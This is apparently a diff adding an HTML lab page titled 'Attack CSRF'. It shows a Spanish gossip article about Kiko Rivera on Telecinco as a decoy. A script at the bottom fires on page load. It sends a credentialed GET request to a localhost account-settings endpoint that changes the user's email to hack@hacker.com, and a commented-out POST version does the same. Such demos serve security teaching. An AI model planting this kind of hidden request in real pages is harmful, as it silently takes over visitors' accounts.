@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Attack CSRF</title>
+    <link rel="stylesheet" href="styles.css">
+  </head>
+  <body>
+    <div class="container">
+      <h1>
+        Kiko Rivera acudirá como invitado estrella al tercer 'Domingo Deluxe'
+      </h1>
+      <ul>
+        <li>Este domingo, a las 22:00, en Telecinco.</li>
+        <li>
+          El surrealista mundo de los 'pantojistas', en 'Cantora, la herencia
+          envenenada': "Parece el Palmar de Troya".
+        </li>
+      </ul>
+      <img
+        src="./content/kiko-rivera-en-sabado-deluxe.png"
+        alt="kiko rivera va este domingo a las 22:00 a telecinco"
+      />
+      <p>
+        Mediaset continúa en la búsqueda de mejorar sus datos en audiencias y
+        apuesta, por tercera semana consecutiva, por hacer doblete de la versión
+        nocturna de Sálvame y emitir el domingo un Deluxe en prime time. Si la
+        semana pasada este contó con una íntima entrevista a Lolita Flores y el
+        polígrafo más tórrido de Kiko Matamoros, esta vez el protagonista de la
+        noche será Kiko Rivera, tras unas semanas dejando respirar el caso
+        Cantora.
+      </p>
+      <p>
+        Así, este domingo, desde las 22:00, se podrá ver en Telecinco. La última
+        vez que Paquirrín acudió al programa, ofreció una entrevista en la que
+        se abrió sobre su depresión, algo que haría llamar a su madre en directo
+        y que terminaría desembocando en el gran desencuentro entre ambos que es
+        la herencia de Cantora.
+      </p>
+      <p>
+        El cantante vuelve así para poner al día con las últimas novedades, como
+        que su tío Agustín planea demandarle en un contexto en que, de por sí,
+        no podría ser más tenso ni tener a la familia más rota. Aunque todo
+        parece indicar que no, podría ser la ocasión en la que el joven diera su
+        brazo a torcer y mostrara interés por recuperar la relación con su
+        madre, que sigue recluida en la finca teniendo muy pocos contactos con
+        el exterior.
+      </p>
+      <p>
+        Lo que es seguro es que, el hijo de la tonadillera, hablará de todo
+        aquello ocurrido en su familia durante las últimas semanas, como la
+        polémica felicitación de la cantante a su nieta Ana, de cinco años,
+        mediante un audio a Irene Rosales; o la reciente muerte de Riverita.
+      </p>
+    </div>
+    <script>
+      // Esto es CSRF con post
+      // fetch("/api/security/edit", {
+      //   method: "POST",
+      //   credentials: "include",
+      //   headers: {
+      //     "Content-Type": "application/json",
+      //   },
+      //   body: JSON.stringify({
+      //     email: "hack@hacker.com",
+      //   }),
+      // });
+      // Esto es CSRF con get
+      fetch("http://localhost:3000/api/security/edit?" +
+        new URLSearchParams({
+                    email: "hack@hacker.com",
+        }), {
+        method: "GET",
+        credentials: "include",
+      })
+        .then((response) => response.text())
+        .then((text) => console.log(text))
+        .catch((error) => console.log(error));
+    </script>
+  </body>
+</html>
